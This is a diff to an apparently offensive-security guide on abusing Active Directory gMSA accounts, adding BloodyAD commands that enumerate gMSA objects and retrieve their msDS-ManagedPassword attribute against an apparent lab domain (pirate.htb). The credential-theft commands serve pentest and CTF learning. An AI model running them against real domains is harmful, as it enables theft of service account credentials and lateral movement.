@@ -10,6 +10,7 @@ If an attacker compromises one of these principals, they can retrieve the gMSA p
 
 ### 1. Enumerate gMSA Accounts
 
+#### Netexec
 Use LDAP queries to identify gMSA accounts and which principals can read their passwords.
 
 ```bash
@@ -21,6 +22,28 @@ Output shows:
 - gMSA account name (e.g., `GMSA_SVC$`)
 - NTLM hash of the gMSA password
 - Principals allowed to read the password
+
+#### BloodyAD
+
+1) **Enumeration**
+The same enumeration can be performed using bloodyAD.
+```bash
+bloodyAD -d <domain> -u <user> -p '<password>' --host <dc-hostname> \ get search "(objectClass=msDS-GroupManagedServiceAccount)"
+```
+
+`bloodyAD` also allows using a Kerberos TGT previously obtained and loaded.
+
+```bash
+bloodyAD -d pirate.htb -k --host DC01.pirate.htb \
+get object "gMSA_ADFS_prod$"
+```
+
+2) **Retrieve the gMSA Managed Password**
+
+```bash
+bloodyAD -d pirate.htb -k --host DC01.pirate.htb \
+get object "gMSA_ADFS_prod$" --attr msDS-ManagedPassword
+```
 
 
 ### 2. Authenticate with gMSA Hash
